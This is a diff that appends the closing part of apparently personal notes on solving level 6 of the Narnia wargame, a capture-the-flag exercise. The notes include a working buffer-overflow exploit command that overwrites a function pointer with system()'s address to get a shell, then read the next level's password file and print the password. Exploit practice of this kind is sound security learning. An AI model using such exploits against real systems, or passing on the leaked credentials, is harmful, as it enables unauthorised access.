@@ -243,3 +243,27 @@ Breakpoint 5, 0x080486bb in main ()
 Continuing.
 [Inferior 1 (process 1108) exited with code 01]
 (gdb) 
+
+====================== wrapping it up ====================================
+
+I see what's going on, right now I have b2 (35 bytes) layed out like this:
+[0-7] A 
+[8-14] /bin/sh 
+[15] A 
+[16-34] &system() 
+
+By the time we execute fp(b1) the parameter passed to system() is b2[8-34]
+The &system() is put into fp from b2[16-20] which is also b1[8].
+
+Therefore, let's try this:
+narnia6@narnia:~$ /narnia/narnia6 $(python -c'print"A"*8+"\x70\x2e\xe6\xf7"') $(python -c'print"A"*8+"/bin/sh"')
+$ whoami
+narnia7
+
+Oh ya!
+
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+
+I don't know why I kept trying to use b2 as b1... that was short sighted. 
+
